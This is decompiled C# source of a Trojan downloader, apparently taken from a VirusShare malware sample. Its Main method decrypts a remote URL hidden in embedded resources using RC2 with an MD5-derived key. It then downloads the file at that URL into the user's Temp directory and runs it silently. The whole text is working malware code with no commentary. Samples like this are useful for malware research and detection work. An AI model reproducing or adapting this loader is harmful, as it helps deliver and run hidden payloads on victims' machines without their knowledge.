// Decompiled with JetBrains decompiler
// Type: tODXNEScLLxkMiuJqItxXMJDVS
// Assembly: n-down, Version=2.5.14.2769, Culture=neutral, PublicKeyToken=null
// MVID: 332595C7-9275-4CC0-83F8-189B17B0505F
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare-00008-msil\Trojan-Downloader.MSIL.Small.di-9633e1f687bc7355f47524704d4fa20b3953293b1208059eb20dd5848c76cfb5.exe

using Microsoft.VisualBasic.CompilerServices;
using My;
using System;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using System.Resources;
using System.Security.Cryptography;
using System.Text;

[StandardModule]
internal sealed class tODXNEScLLxkMiuJqItxXMJDVS
{
  [STAThread]
  public static void Main()
  {
    ResourceManager resourceManager = new ResourceManager("N", Assembly.GetExecutingAssembly());
    string address = tODXNEScLLxkMiuJqItxXMJDVS.RC2D(Conversions.ToString(resourceManager.GetObject("LoL")), Conversions.ToString(resourceManager.GetObject("FCK")));
    string str1 = MyProject.Computer.FileSystem.SpecialDirectories.Temp + "\\";
    int num = address.LastIndexOf("/");
    string str2 = address.Substring(checked (num + 1));
    if (File.Exists(str1 + str2))
      File.Delete(str1 + str2);
    MyProject.Computer.Network.DownloadFile(address, str1 + str2);
    Process.Start(str1 + str2);
  }

  public static string RC2D(string input, string pass)
  {
    RC2CryptoServiceProvider cryptoServiceProvider1 = new RC2CryptoServiceProvider();
    MD5CryptoServiceProvider cryptoServiceProvider2 = new MD5CryptoServiceProvider();
    string str;
    try
    {
      byte[] hash = cryptoServiceProvider2.ComputeHash(Encoding.ASCII.GetBytes(pass));
      cryptoServiceProvider1.Key = hash;
      cryptoServiceProvider1.Mode = CipherMode.ECB;
      ICryptoTransform decryptor = cryptoServiceProvider1.CreateDecryptor();
      byte[] inputBuffer = Convert.FromBase64String(input);
      str = Encoding.ASCII.GetString(decryptor.TransformFinalBlock(inputBuffer, 0, inputBuffer.Length));
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      ProjectData.ClearProjectError();
    }
    return str;
  }
}
